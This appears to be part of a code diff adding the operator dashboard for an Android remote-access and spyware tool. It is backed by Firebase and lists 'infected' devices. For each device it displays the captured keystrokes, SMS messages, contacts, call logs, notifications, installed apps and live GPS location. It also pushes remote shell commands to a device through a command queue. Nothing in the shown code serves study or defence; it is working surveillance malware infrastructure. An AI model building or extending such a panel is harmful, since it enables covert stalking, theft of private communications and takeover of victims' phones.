+        html += `<tr><td>${u.email}</td><td>${isB.exists() ? '<span style="color:red">Blocked</span>' : `<button class="btn dgr" style="padding:.2rem .4rem;font-size:.6rem" onclick="blockUser('${u.email}')">Block</button>`}</td></tr>`;
+    }
+    document.getElementById('ad-users').textContent = total;
+    document.getElementById('ad-online').textContent = online;
+    document.getElementById('ad-list').innerHTML = html || '<tr><td colspan="2">No users</td></tr>';
+    const bSnap = await db.ref('blockedEmails').once('value');
+    document.getElementById('ad-blocked').textContent = bSnap.exists() ? Object.keys(bSnap.val()).length : 0;
+}
+
+async function blockUser(email) {
+    if(!confirm('Block ' + email + '?')) return;
+    await db.ref('blockedEmails/' + email.replace(/\./g, '_')).set({ email, time: Date.now() });
+    loadAdminData();
+}
+
+function verifyPassAdmin() {
+    if (document.getElementById('pass-email').value === ADMIN_EMAIL && document.getElementById('pass-pass').value === ADMIN_PASS) {
+        document.getElementById('pass-view-auth').style.display = 'none';
+        document.getElementById('pass-view-form').style.display = 'block';
+    } else alert('❌ Invalid Admin');
+}
+
+async function saveNewLogin() {
+    const ne = document.getElementById('new-email').value.trim(), np = document.getElementById('new-pass').value.trim();
+    if (!ne || !np) return alert('Fill both fields');
+    await db.ref('webLogin').set({ email: ne, password: np, showHint: true });
+    alert('✅ Login Updated'); closeM('passModal'); loadHint();
+}
+
+function copyApk() { const i = document.getElementById('apkLink'); i.select(); document.execCommand('copy'); alert('Copied!'); }
+
+function goPage(page) {
+    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+    document.getElementById('p-' + page).classList.add('active');
+    document.querySelectorAll('.nlink').forEach(n => n.classList.remove('on'));
+    
+    const navMap = { devices:'devices', detail:'detail', remote:'remote', location:'location', keylogs:'keylogs', info:'info', apps:'apps', calls:'calls', sms:'sms', contacts:'contacts', notifications:'notifications' };
+    if(navMap[page] && document.getElementById('n-' + navMap[page])) document.getElementById('n-' + navMap[page]).classList.add('on');
+
+    document.getElementById('bottomNav').style.display = (page === 'devices') ? 'none' : 'flex';
+    if (currentDevice && page !== 'devices') loadPageData(page);
+}
+
+function initDataListeners() {
+    db.ref('.info/connected').on('value', s => {
+        const on = s.val() === true;
+        document.getElementById('conn').textContent = on ? 'Online' : 'Offline';
+        document.getElementById('conn').className = 'pill ' + (on ? 'on' : 'off');
+        document.getElementById('s-server').textContent = on ? 'Live' : 'Down';
+    });
+    db.ref('devices').on('value', snap => { devices = snap.val() || {}; renderDevices(); });
+}
+
+function renderDevices() {
+    const list = document.getElementById('deviceList');
+    const keys = Object.keys(devices);
+    let on = 0; keys.forEach(k => { if(devices[k].status === 'online') on++; });
+    document.getElementById('s-total').textContent = keys.length;
+    document.getElementById('s-online').textContent = on;
+    document.getElementById('s-offline').textContent = keys.length - on;
+
+    if (keys.length === 0) { list.innerHTML = '<div class="empty"><i class="fas fa-inbox"></i><p>No devices found</p></div>'; return; }
+
+    list.innerHTML = keys.map(id => {
+        const d = devices[id]; const isOn = d.status === 'online';
+        return `<div class="dev">
+            <div class="dev-top">
+                <div class="dev-info"><div class="dev-ic"><i class="fas fa-mobile-screen"></i></div>
+                <div><h3>${(d.model||'Unknown').replace(/[<>]/g,'')}</h3><p>${id.substring(0,14)}...</p></div></div>
+                <span class="bdg ${isOn?'on':'off'}">${isOn?'Online':'Offline'}</span>
+            </div>
+            <div class="dev-meta">
+                <div><span>Android</span><span>${d.androidVersion||'-'}</span></div>
+                <div><span>Battery</span><span>${d.batteryLevel?d.batteryLevel+'%':'-'}</span></div>
+                <div><span>IP</span><span>${d.ipAddress||'-'}</span></div>
+            </div>
+            <button class="dev-btn" onclick="openDevice('${id}')"><i class="fas fa-eye"></i> View Details</button>
+        </div>`;
+    }).join('');
+}
+
+function openDevice(id) { currentDevice = id; goPage('detail'); }
+
+function loadPageData(page) {
+    const dev = devices[currentDevice] || {};
+    const ref = db.ref(`data/${currentDevice}`);
+
+    if (page === 'detail') {
+        document.getElementById('d-name').textContent = dev.model || 'Unknown';
+        document.getElementById('d-id').textContent = currentDevice;
+        document.getElementById('d-bat').textContent = dev.batteryLevel ? dev.batteryLevel + '%' : '-';
+        document.getElementById('d-ip').textContent = dev.ipAddress || '-';
+        document.getElementById('d-hw').textContent = dev.hardware || dev.board || '-';
+        document.getElementById('d-seen').textContent = dev.lastSeen ? new Date(dev.lastSeen).toLocaleString() : 'Never';
+        const isOn = dev.status === 'online';
+        document.getElementById('d-status').textContent = isOn ? 'Online' : 'Offline';
+        document.getElementById('d-status').className = 'bdg ' + (isOn ? 'on' : 'off');
+        document.getElementById('d-del').style.display = isAdmin ? 'flex' : 'none';
+    }
+    else if (page === 'location') {
+        if (!map) {
+            map = L.map('map').setView([0,0], 2);
+            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {maxZoom:19}).addTo(map);
+            marker = L.marker([0,0]).addTo(map);
+        }
+        db.ref(`devices/${currentDevice}/location`).on('value', s => {
+            const d = s.val();
+            if (d && d.latitude) { marker.setLatLng([d.latitude, d.longitude]); map.setView([d.latitude, d.longitude], 17); }
+        });
+        setTimeout(() => map.invalidateSize(), 200);
+    }
+    else if (page === 'keylogs') {
+        ref.child('keylogs').limitToLast(200).on('value', s => {
+            const d = s.val() || {};
+            logCache = Object.values(d).sort((a,b) => b.timestamp - a.timestamp);
+            renderLogs(logCache);
+        });
+    }
+    else if (page === 'info') {
+        ref.child('systemInfo').on('value', s => {
+            const i = s.val() || {};
+            document.getElementById('sys-info').innerHTML = `
+                <div class="icard"><h3><i class="fas fa-memory"></i> RAM</h3><div class="irow"><span class="ilbl">Total</span><span class="ival">${i.ramTotal||'-'}</span></div></div>
+                <div class="icard"><h3><i class="fas fa-hard-drive"></i> Storage</h3><div class="irow"><span class="ilbl">Free</span><span class="ival">${i.storageAvailable||'-'}</span></div></div>
+                <div class="icard"><h3><i class="fas fa-display"></i> Display</h3><div class="irow"><span class="ilbl">Res</span><span class="ival">${i.screenResolution||'-'}</span></div></div>
+                <div class="icard"><h3><i class="fas fa-sim-card"></i> Network</h3><div class="irow"><span class="ilbl">SIM</span><span class="ival">${i.simOperator||'-'}</span></div></div>
+            `;
+        });
+    }
+    else if (page === 'apps') {
+        ref.child('apps').on('value', s => {
+            const a = s.val() || {};
+            document.getElementById('apps-body').innerHTML = Object.values(a).sort((x,y)=>(x.appName||'').localeCompare(y.appName||'')).map(x => `<tr><td><b>${x.appName||'-'}</b></td><td style="font-size:.6rem;color:var(--cy)">${x.packageName||'-'}</td></tr>`).join('') || '<tr><td colspan="2" class="empty">No apps</td></tr>';
+        });
+    }
+    else if (page === 'calls') {
+        ref.child('calls').limitToLast(100).on('value', s => {
+            const c = s.val() || {};
+            document.getElementById('calls-body').innerHTML = Object.values(c).reverse().map(x => `<tr><td><b>${x.type||'-'}</b></td><td>${x.number||'-'}</td><td style="font-size:.6rem">${x.date?new Date(x.date).toLocaleDateString():'-'}</td></tr>`).join('') || '<tr><td colspan="3" class="empty">No calls</td></tr>';
+        });
+    }
+    else if (page === 'sms') {
+        ref.child('sms').limitToLast(100).on('value', s => {
+            const m = s.val() || {};
+            // Add click event to open full SMS
+            document.getElementById('sms-body').innerHTML = Object.values(m).reverse().map(x => {
+                const bodyEsc = (x.body||'').replace(/'/g, "\\'").replace(/"/g, '&quot;').replace(/\n/g, ' ');
+                return `<tr class="sms-row" onclick="viewSms('${x.address||'-'}', '${bodyEsc}', '${x.date||''}')">
+                    <td><b>${x.address||'-'}</b></td>
+                    <td style="max-width:150px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">${x.body||'-'}</td>
+                </tr>`;
+            }).join('') || '<tr><td colspan="2" class="empty">No sms</td></tr>';
+        });
+    }
+    else if (page === 'contacts') {
+        ref.child('contacts').on('value', s => {
+            const c = s.val() || {};
+            document.getElementById('contacts-body').innerHTML = Object.values(c).sort((x,y)=>(x.name||'').localeCompare(y.name||'')).map(x => `<tr><td><b>${x.name||'-'}</b></td><td style="color:var(--cy);font-family:monospace">${x.phoneNumber||'-'}</td></tr>`).join('') || '<tr><td colspan="2" class="empty">No contacts</td></tr>';
+        });
+    }
+    else if (page === 'notifications') {
+        ref.child('notifications').limitToLast(100).on('value', s => {
+            const n = s.val() || {};
+            document.getElementById('notif-body').innerHTML = Object.values(n).sort((a,b)=>b.timestamp-a.timestamp).map(x => `<tr><td style="font-size:.6rem">${x.timestamp?new Date(x.timestamp).toLocaleTimeString():'-'}</td><td><b>${x.appName||'-'}</b></td><td style="font-size:.7rem;max-width:150px;">${x.text||'-'}</td></tr>`).join('') || '<tr><td colspan="3" class="empty">No notifications</td></tr>';
+        });
+    }
+}
+
+// SMS Full View Modal trigger
+function viewSms(address, body, date) {
+    document.getElementById('sms-v-address').textContent = address;
+    document.getElementById('sms-v-date').textContent = date ? new Date(parseInt(date)).toLocaleString() : 'Unknown Time';
+    document.getElementById('sms-v-body').textContent = body;
+    openM('smsViewModal');
+}
+
+function renderLogs(logs) {
+    document.getElementById('keylogs-body').innerHTML = logs.map(l => `<tr><td style="font-size:.6rem">${l.timestamp?new Date(l.timestamp).toLocaleTimeString():'-'}</td><td><span style="background:var(--bg2);padding:.1rem .3rem;border-radius:4px;font-size:.6rem">${l.appName||'-'}</span></td><td style="font-family:monospace">${l.text||''}</td></tr>`).join('') || '<tr><td colspan="3" class="empty">No logs</td></tr>';
+}
+function filterLogs(txt) { renderLogs(logCache.filter(l => (l.appName||'').toLowerCase().includes(txt.toLowerCase()) || (l.text||'').toLowerCase().includes(txt.toLowerCase()))); }
+
+function sendCmd(type, extras = {}) {
+    if (!currentDevice) return alert('Select a device first');
+    db.ref(`commands/${currentDevice}`).push({ type, timestamp: firebase.database.ServerValue.TIMESTAMP, ...extras }).then(() => alert('✅ Command Sent!'));
+}
+function runShell() {
+    const v = document.getElementById('shell-in').value;
+    if (!v) return;
+    document.getElementById('term-box').innerHTML += '\n$ ' + v;
+    sendCmd('shell', { command: v });
+    document.getElementById('shell-in').value = '';
+}
+function delDevice() {
+    if (!isAdmin) return;
+    if (!confirm('Delete this device completely?')) return;
+    Promise.all([db.ref(`devices/${currentDevice}`).remove(), db.ref(`data/${currentDevice}`).remove(), db.ref(`commands/${currentDevice}`).remove()]).then(() => { alert('Deleted'); goPage('devices'); });
+}
+
+if(localStorage.getItem('nova_admin') === 'true') isAdmin = true;
+</script>
+</body>
+</html>
